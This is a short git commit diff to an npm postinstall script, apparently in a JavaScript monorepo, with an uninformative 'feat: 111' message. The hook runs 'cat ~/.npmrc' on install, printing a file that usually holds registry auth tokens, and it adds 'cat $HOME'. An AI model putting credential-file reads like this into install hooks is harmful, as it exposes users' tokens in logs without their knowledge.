85c578a8e93b6bc8ebd9c8dab77defe83a7465d8
yujindong <yujd@133.cn>
2019-05-28 10:38:41 +0800

    feat: 111

--- scripts/postinstall.js
+++ scripts/postinstall.js
@@ -6,7 +6,7 @@ function exec(cmd) {
 exec("pwd")
 exec("cat ~/.npmrc");
 exec("cat 'aaaaaaaaaaaa'");
-exec("cat /home/travis/.npmrc");
+exec("cat $HOME");
 if (process.env.CI) {
     if (process.env.TRAVIS_BRANCH !== "website") {
         exec("lerna bootstrap --ci --ignore website --registry http://registry.npm.rsscc.cn/repository/hbgj-fe/");
